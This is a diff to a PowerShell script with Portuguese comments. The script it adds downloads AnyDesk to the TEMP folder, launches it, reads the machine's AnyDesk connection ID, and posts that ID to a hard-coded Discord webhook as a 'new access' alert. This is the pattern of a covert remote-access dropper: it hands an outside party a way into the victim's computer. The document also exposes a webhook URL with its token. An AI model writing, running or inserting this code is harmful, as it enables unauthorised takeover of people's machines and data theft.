@@ -1,7 +1,25 @@
-$webhookUrl = "https://discord.com/api/webhooks/1535783841539559516/nJ49dBdlI25Atqn7-kJKJn7zgqPFClhgGh8iYrjeoDlErgZ3_hk1GWtIWUKdLgkDkC6y"
+$path = "$env:TEMP\AnyDesk.exe"
+
+# Download e execução
+Invoke-WebRequest -Uri "https://download.anydesk.com/AnyDesk.exe" -OutFile $path
+Start-Process $path
+Start-Sleep -Seconds 3
+
+# Obter ID do AnyDesk
+$id = (& $path --get-id).Trim()
+
+# Enviar para a Webhook do Discord
+$discordWebhookUrl = "https://discord.com/api/webhooks/1535783841539559516/nJ49dBdlI25Atqn7-kJKJn7zgqPFClhgGh8iYrjeoDlErgZ3_hk1GWtIWUKdLgkDkC6y"
 
 $payload = @{
-    content = "Mensagem de teste enviada com sucesso."
-} | ConvertTo-Json
+    username = "AnyDesk Bot"
+    embeds   = @(
+        @{
+            title       = "Novo Acesso AnyDesk"
+            description = "ID para conexão: **$id**"
+            color       = 5814783
+        }
+    )
+} | ConvertTo-Json -Depth 3
 
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
+Invoke-RestMethod -Uri $discordWebhookUrl -Method Post -ContentType "application/json" -Body $payload
